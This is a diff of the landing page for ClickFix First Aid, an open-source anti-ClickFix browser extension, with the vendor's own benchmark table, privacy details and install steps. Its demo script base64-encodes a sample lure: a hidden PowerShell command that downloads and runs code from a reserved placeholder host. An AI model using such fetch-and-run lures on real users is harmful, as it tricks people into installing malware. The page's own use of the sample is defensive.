+        <h2>Tested against six other anti-ClickFix extensions</h2>
+        <p>25 attack commands from public threat reports published in 2025 and 2026, and 24 ordinary commands, replayed in Chromium against each extension with its default settings on 6 November 2026.</p>
+      </div>
 
-  <h2 id="lock-win-r">Optional: turn off Win+R</h2>
-  <p>If you never use the Win+R shortcut, <code>Protect-RunDialog.ps1</code> turns off Win+R and Win+X for your account, so trap instructions simply do nothing. Run it the same way and pick option 1. Pick option 2 to undo it.</p>
+      <div class="kpis">
+        <div class="kpi"><div class="v">25<small> of 25</small></div><div class="l">attacks stopped on fake verification pages</div></div>
+        <div class="kpi"><div class="v">20<small> of 25</small></div><div class="l">stopped with no instructions on the page</div></div>
+        <div class="kpi"><div class="v">5<small> of 5</small></div><div class="l">ways a page can copy text, all covered</div></div>
+        <div class="kpi good"><div class="v">0<small> of 24</small></div><div class="l">ordinary commands blocked; 6 installers paused for one click</div></div>
+      </div>
 
-  <h2 id="privacy">Privacy</h2>
-  <ul>
-    <li>The extension has no network access and sends nothing anywhere. Its only permission besides reading pages is local storage, for its own counters and settings.</li>
-    <li>The scripts are read-only, except the Win+R switch, which changes one setting for your user and can be undone.</li>
-    <li>Everything is open source, so anyone can check this.</li>
-  </ul>
+      <div class="board">
+        <div class="board-head"><h3>Head-to-head results</h3><span>Higher is better in every column</span></div>
+        <table class="cmp">
+          <thead>
+            <tr><th scope="col">Extension</th><th scope="col">Attacks stopped, fake verification page</th><th scope="col">Attacks stopped, no instructions</th><th scope="col">Copy methods covered</th><th scope="col">Ordinary commands copied unchanged</th></tr>
+          </thead>
+          <tbody>
+            <tr class="us">
+              <th scope="row">ClickFix First Aid<small>0.3.3</small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>25/25</b><span class="meter"><i style="width:100%"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>20/25</b><span class="meter"><i style="width:80%"></i></span><em>8 of them paused</em></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>5/5</b><span class="meter"><i style="width:100%"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>18/24</b><span class="meter ok"><i style="width:75%"></i></span><em>6 installers paused</em></div></td>
+            </tr>
+            <tr>
+              <th scope="row">ClickFix Guard (samdem-ai)<small>1.0.1</small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>24/25</b><span class="meter"><i style="width:96%"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>21/25</b><span class="meter"><i style="width:84%"></i></span></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>4/5</b><span class="meter"><i style="width:80%"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>24/24</b><span class="meter ok"><i style="width:100%"></i></span></div></td>
+            </tr>
+            <tr>
+              <th scope="row">ClickFix Warden<small>0.1.1</small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>23/25</b><span class="meter"><i style="width:92%"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>8/25</b><span class="meter"><i style="width:32%"></i></span></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>4/5</b><span class="meter"><i style="width:80%"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>24/24</b><span class="meter ok"><i style="width:100%"></i></span></div></td>
+            </tr>
+            <tr>
+              <th scope="row">ClickFix Mitigator<small>0.4.10</small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>22/25</b><span class="meter"><i style="width:88%"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>22/25</b><span class="meter"><i style="width:88%"></i></span></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>3/5</b><span class="meter"><i style="width:60%"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>17/24</b><span class="meter ok"><i style="width:70.8%"></i></span><em>7 blocked</em></div></td>
+            </tr>
+            <tr>
+              <th scope="row">ClickFix Guard (frameman)<small>2.0.0 <span class="flag">Warns only</span></small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>0/25</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>0/25</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>0/5</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>24/24</b><span class="meter ok"><i style="width:100%"></i></span></div></td>
+            </tr>
+            <tr>
+              <th scope="row">ClickFix Guard (samurayski)<small>0.4.4 <span class="flag">Warns only</span></small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>0/25</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>0/25</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>0/5</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>24/24</b><span class="meter ok"><i style="width:100%"></i></span></div></td>
+            </tr>
+            <tr>
+              <th scope="row">StopFix<small>1.0 <span class="flag">Warns only</span></small></th>
+              <td data-label="Attacks stopped, fake verification page"><div class="cell"><b>0/25</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Attacks stopped, no instructions"><div class="cell"><b>0/25</b><span class="meter"><i style="width:0"></i></span></div></td>
+              <td data-label="Copy methods covered"><div class="cell"><b>1/5</b><span class="meter"><i style="width:20%"></i></span></div></td>
+              <td data-label="Ordinary commands copied unchanged"><div class="cell"><b>24/24</b><span class="meter ok"><i style="width:100%"></i></span></div></td>
+            </tr>
+          </tbody>
+        </table>
+        <div class="board-notes">
+          <p>&ldquo;Stopped&rdquo; means the attack never reached the clipboard. Extensions marked &ldquo;Warns only&rdquo; show a warning but leave the command on the clipboard, so a visitor who pastes anyway still runs it. For ClickFix First Aid, 12 of the 20 commands on pages without instructions were blocked and 8 were paused until the user confirmed.</p>
+          <p>Where others did better: on pages with no instructions, ClickFix Mitigator stopped 22 and ClickFix Guard (samdem-ai) 21. Rules for the five commands we missed are planned for the next version.</p>
+        </div>
+      </div>
+      <div class="board-links">
+        <a class="btn" href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/report/ClickFix-First-Aid-Technical-Report.pdf">Read the technical report</a>
+        <a class="btn" href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/tree/main/benchmark">Method and raw results</a>
+      </div>
+    </div>
+  </section>
 
-  <footer>
-    ClickFix First Aid v0.3.3. Free and open source under the MIT license. <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid">Source code</a>.
-  </footer>
+  <section class="block" id="privacy">
+    <div class="wrap spec">
+      <div class="head">
+        <h2>It watches your clipboard, not you</h2>
+        <p>The extension needs to see what pages copy. Everything it learns stays in your browser, and anyone can read the code to check.</p>
+      </div>
+      <dl>
+        <div><dt>Permissions</dt><dd>Reads pages to spot trap instructions and stores its own settings. No other permissions.</dd></div>
+        <div><dt>Internet access</dt><dd><strong>None.</strong> The extension&rsquo;s own pages are blocked from making network requests.</dd></div>
+        <div><dt>Kept on your computer</dt><dd>Counters, the last 20 warnings with a short preview (links broken), your settings and the sites you allowed. Clear it any time.</dd></div>
+        <div><dt>Sent anywhere</dt><dd><strong>Nothing.</strong> No account, no analytics, no tracking.</dd></div>
+        <div><dt>Source code</dt><dd>Open source under the MIT license. Read the <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/PRIVACY.md">privacy policy</a>.</dd></div>
+      </dl>
+    </div>
+  </section>
+
+  <section class="block" id="install">
+    <div class="wrap">
+      <div class="head">
+        <h2>Install in two minutes</h2>
+        <p>Then open the <a href="demo.html">safe demo</a> and tick the box. You should see a red warning.</p>
+      </div>
+      <div class="install">
+        <div class="col">
+          <div class="how">
+            <h3>Microsoft Edge</h3>
+            <p>Published on Microsoft Edge Add-ons. Updates arrive automatically.</p>
+            <a class="btn primary" href="https://microsoftedge.microsoft.com/addons/detail/adghmlcmbimmjfjofhgndnoccnpgenmh">Add to Microsoft Edge</a>
+          </div>
+          <div class="how">
+            <h3>Google Chrome</h3>
+            <p>Until it is in the Chrome Web Store:</p>
+            <ol>
+              <li>Download <code>clickfix-first-aid-extension-v0.3.3.zip</code> from the latest release and unzip it.</li>
+              <li>Open <code>chrome://extensions</code> and switch on Developer mode.</li>
+              <li>Click Load unpacked and choose the unzipped folder.</li>
+            </ol>
+            <a class="btn" href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/releases/latest">Download the latest release</a>
+          </div>
+        </div>
+        <div class="col">
+          <div class="how" id="check">
+            <h3>Check a Windows PC</h3>
+            <ol>
+              <li>Download <code>Check-ClickFix.ps1</code> from the latest release.</li>
+              <li>Right-click the file and choose Run with PowerShell.</li>
+              <li>Read the result. It only reads your PC.</li>
+            </ol>
+            <p class="warn">Never run this, or anything else, by pasting a command a website gave you. That is exactly the trick this project protects you from.</p>
+            <a class="btn" href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/releases/latest">Download the PC check</a>
+          </div>
+          <div class="how optional">
+            <p><strong>Optional: turn off Win+R.</strong> If you never use the Win+R shortcut, <code>Protect-RunDialog.ps1</code> turns off Win+R and Win+X for your account, so trap instructions simply do nothing. Run it the same way and pick option 1. Pick option 2 to undo it.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="help">
+    <div class="wrap">
+      <div>
+        <h2>Already ran a command a website gave you?</h2>
+        <p>Act now, from your phone rather than that computer. The recovery guide takes you through it in order.</p>
+      </div>
+      <a class="btn primary" href="recovery.html">Open the recovery guide</a>
+    </div>
+  </section>
 </main>
+
+<footer>
+  <div class="wrap">
+    <span>ClickFix First Aid v0.3.3. Free and open source under the MIT license.</span>
+    <nav aria-label="Project">
+      <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid">Source code</a>
+      <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/report/ClickFix-First-Aid-Technical-Report.pdf">Technical report</a>
+      <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/PRIVACY.md">Privacy</a>
+      <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/SECURITY.md">Report a problem</a>
+      <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/CHANGELOG.md">Changelog</a>
+    </nav>
+  </div>
+</footer>
+
+<script>
+  // The example command is stored base64-encoded so antivirus programs do not
+  // mistake this page for an attack page. It points at a reserved address.
+  (function () {
+    var OFF = atob('cG93ZXJzaGVsbCAtdyBoaWRkZW4gLWMgImlybSBodHRwczovL2V4YW1wbGUuaW52YWxpZC92IHwgaWV4IiAgICMgSSBhbSBub3QgYSByb2JvdCAtIFZlcmlmaWNhdGlvbiBJRDogNzczMQ==');
+    var ON = '# STOP. ClickFix First Aid blocked this. A website tried to trick you into running a command on your computer. Close that page. Real human checks never ask you to paste anything.';
+    var box = document.getElementById('console');
+    var clip = document.getElementById('clip');
+    var field = document.getElementById('runfield');
+    var buttons = box.querySelectorAll('.seg button');
+    var touched = false;
+    function show(mode, animate) {
+      box.setAttribute('data-mode', mode);
+      clip.textContent = mode === 'on' ? ON : OFF;
+      field.textContent = mode === 'on' ? ON : OFF;
+      buttons.forEach(function (b) { b.setAttribute('aria-pressed', String(b.getAttribute('data-mode') === mode)); });
+      if (animate) { box.classList.remove('swapping'); void box.offsetWidth; box.classList.add('swapping'); }
+    }
+    buttons.forEach(function (b) {
+      b.addEventListener('click', function () { touched = true; show(b.getAttribute('data-mode'), b.getAttribute('data-mode') === 'on'); });
+    });
+    var still = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    if (still) { show('on', false); return; }
+    // One short intro: show what the page copied, then the swap.
+    show('off', false);
+    setTimeout(function () { if (!touched) show('on', true); }, 1600);
+  })();
+</script>
 </body>
 </html>
